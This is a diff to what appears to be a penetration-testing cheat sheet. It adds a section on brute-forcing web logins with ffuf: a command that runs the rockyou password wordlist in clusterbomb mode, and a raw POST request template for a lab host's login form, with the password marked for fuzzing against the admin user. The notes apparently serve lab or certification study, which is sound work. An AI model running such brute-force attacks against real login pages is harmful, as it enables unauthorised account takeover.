@@ -117,6 +117,42 @@ Log files such as .log, .txt, and .xml files.
 Backup files such as .bak, .zip, and .tar.gz files.
 Database files such as .mdb, .sqlite, .db, and .sql files.
 ````
+##### Brute Forcing / Fuzzing logins techniques
+###### ffuf
+````
+ffuf -c -request request.txt -request-proto http -mode clusterbomb -fw 1 -w /usr/share/wordlists/rockyou.txt:FUZZ
+````
+````
+POST /index.php HTTP/1.1
+
+Host: 10.11.1.252:8000
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 42
+
+Origin: http://10.11.1.252:8000
+
+Connection: close
+
+Referer: http://10.11.1.252:8000/login.php
+
+Cookie: PHPSESSID=89i7fj326pnqqarv9c03dpcuu2
+
+Upgrade-Insecure-Requests: 1
+
+
+
+username=admin&password=<b>FUZZ<b>&submit=Log+In
+````
 ##### CMS 
 ###### WP Scan
 ````
